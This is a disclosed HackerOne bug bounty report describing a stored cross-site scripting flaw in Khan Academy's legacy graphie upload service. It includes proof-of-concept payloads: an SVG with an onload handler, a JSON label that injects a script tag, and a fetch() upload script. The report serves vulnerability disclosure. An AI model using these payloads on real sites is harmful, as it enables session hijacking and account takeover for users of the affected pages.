# XSS on using the legacy "Graphie To Png" API

## Report Details
- **Report ID**: 2846011
- **URL**: https://hackerone.com/reports/2846011
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2024-11-18T08:39:51.846Z
- **Disclosed**: 2025-02-06T16:26:40.528Z

## Reporter
- **Username**: sikn
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: khanacademy

## Vulnerability Information

An attacker can can upload malicious graphies via (http://graphie-to-png.kasandbox.org/) and (http://graphie-to-png.khanacademy.systems/) that exploit the graphie renderer.
The attack targets any page that has a graphie (`khanacademy.org`!!), as well as `cdn.kastatic.org` and `ka-perseus-graphie.s3.amazonaws.com`

# Proof of concept
## Step 1: Uploading a malicious graphie
consider the following example where https://ka-perseus-graphie.s3.amazonaws.com/2122427aa8dc4ef2a59058bc1a7a934ba6ca6747.svg is used in an article, we will override it by uploading the same JS but with malicious SVG and JSON data (because the hash is a hash of the JS).

1. **Malicious SVG:** The SVG is modified to include a malicious `onload` attribute.
```html
<svg ... onload="alert('SIKN')">...</svg>
```
2. **Malicious JSON:** A label is modified with `typesetAsMath: false`, causing the graphie renderer to inject our code to DOM. This is what will target `khanacademy.org`
```json
{
	"labels": [
		{
			"content": "<script>alert('SIKN')</script>",
			"typesetAsMath": false,
			...
		},
		...
	],
	...
}
```
```js
var form = new FormData();
form.append("js", ORIGINAL_JS);
form.append("svg", XSS_SVG);
form.append("other_data", JSON.stringify(XSS_JSON));

await fetch("http://graphie-to-png.kasandbox.org/svg", {
    "method": "POST",
    "body": form
}).then(r=>r.text())
```


## Step 2: Wait patiently
Wait until cdn.kastatic.org updates its cache, for this example I had already prepared it by not caching the original graphie (https://cdn.kastatic.org/ka-perseus-graphie/2122427aa8dc4ef2a59058bc1a7a934ba6ca6747.svg)

As for the malicious JSON, using the devtools override feature to simulate an attack shows that it works:
{F3766148}

## Impact

XSS on pages that use graphies, potentially leading to account takeovers.

## Attachments
- POC.png
